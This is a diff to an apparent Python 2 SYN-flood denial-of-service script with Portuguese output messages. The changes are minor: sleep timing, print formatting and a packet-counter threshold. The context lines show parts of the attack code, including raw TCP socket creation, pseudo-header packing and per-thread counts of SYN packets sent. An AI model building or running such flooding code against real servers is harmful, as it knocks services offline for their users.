@@ -33,16 +33,14 @@ def menu():
 def show_begin():
     import time
     print 'Inciando o ataque...\n\n'
-    time.sleep(4) 
+    time.sleep(3) 
 
 def show_who(ip,numero):
-    print '----------------------------------------------------'
     print ' O servidor ',ip,'esta sendo pela thread ',numero
-    print '----------------------------------------------------\n'
 
 def attack(numero_thread): 
     #create a raw socket
-    import time
+    #import time
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -125,7 +123,7 @@ def attack(numero_thread):
         source_address = socket.inet_aton( source_ip )
         tcp_length = len(tcp_header)
 
-        if contador > 50000:
+        if contador > 49999:
             print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
             contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
